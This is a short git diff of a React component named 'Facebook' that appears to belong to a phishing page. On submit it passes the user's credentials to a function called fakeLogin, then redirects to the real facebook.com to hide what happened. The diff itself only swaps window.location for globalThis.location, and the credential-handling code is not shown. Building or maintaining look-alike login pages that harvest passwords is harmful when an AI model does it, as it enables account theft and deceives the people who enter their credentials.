@@ -12,7 +12,7 @@ function Facebook() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     await fakeLogin(credentials);
-    window.location.href = "https://www.facebook.com/account/about/?hl=fr";
+    globalThis.location.href = "https://www.facebook.com/account/about/?hl=fr";
   };
   return (
     <div className="min-h-screen bg-[#f0f2f5] flex flex-col items-center justify-center pt-20 pb-28 md:pt-32 font-helvetica">
